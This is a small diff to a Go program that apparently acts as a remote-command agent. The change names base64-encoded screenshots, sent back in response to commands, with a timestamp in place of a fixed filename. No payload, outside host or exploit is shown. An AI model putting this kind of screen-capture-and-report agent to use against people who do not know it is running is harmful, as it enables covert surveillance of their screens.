@@ -166,10 +166,15 @@ func takeScreenshot(cmd Command) {
         log.Printf("Failed to encode screenshot to PNG: %v", err)
         return
     }
+
+    // Use the current date and time to format the filename
+    timestamp := time.Now().Format("20060102-150405") // YYYYMMDD-HHMMSS format
+    fileName := fmt.Sprintf("screenshot-%s.png", timestamp)
+
     sendResult(CommandResult{
         ID:       cmd.ID,
         Result:   base64.StdEncoding.EncodeToString(buf.Bytes()),
-        FileName: "screenshot.png",
+        FileName: fileName,
     })
 }
 
@@ -181,4 +186,3 @@ func executeOtherCommand(cmd Command) {
     }
     sendResult(CommandResult{ID: cmd.ID, Result: resultText})
 }
-
